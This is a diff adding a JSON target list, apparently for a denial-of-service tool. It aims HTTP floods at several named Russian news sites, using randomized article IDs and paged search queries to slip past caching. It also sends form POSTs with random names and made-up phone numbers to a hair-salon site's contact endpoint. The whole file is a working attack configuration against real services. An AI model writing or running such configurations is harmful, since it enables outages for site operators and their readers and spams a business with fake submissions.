@@ -1,0 +1,46 @@
+{
+  "targets": [
+    {
+      "target": "https://www.nakanune.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.nakanune.ru/\"}",
+        "path_qs": "/news/2022/01/01/{{int(1,22682101)}}/"
+      }
+    },
+    {
+      "target": "https://www.nakanune.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://www.nakanune.ru/\"}",
+        "path_qs": "/search/?_search=%D0%B5%D1%82%D0%BE&author=&articles=1&news=1&video=1&full_text=1&keywords=1&from=&to=&region=&tematik=&tpage={{int(1,406)}}"
+      }
+    },
+    {
+      "target": "https://newdaynews.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://newdaynews.ru/\"}",
+        "path_qs": "/seek/?text=%D0%B5%D1%82%D0%BE&ni=0&sel=0&vid=0&mfr=0&list={{int(1,100)}}"
+      }
+    },
+    {
+      "target": "https://novorosinform.org",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://novorosinform.org/\"}",
+        "path_qs": "/ajax/loadmore?page={{int(1,10000)}}&category="
+      }
+    },
+    {
+      "target": "https://modshairrussia.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"name\"\n\n{{str(6)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"phone\"\n\n+7 (495) 625-{{int(1,9)}}{{int(1,9)}}-{{int(1,9)}}{{int(1,9)}}\n-----------------------------17097944912524891368454341740\nContent-Disposition: form-data; name=\"subject\"\n\nTotal look\n-----------------------------17097944912524891368454341740--\n",
+        "headers": "{\"Content-Type\": \"multipart/form-data; boundary=---------------------------17097944912524891368454341740\", \"Referer\": \"https://modshairrussia.ru/\", \"X-Requested-With\": \"X-Requested-With\"}",
+        "path_qs": "/send",
+        "verb": "POST"
+      }
+    }
+  ]
+}
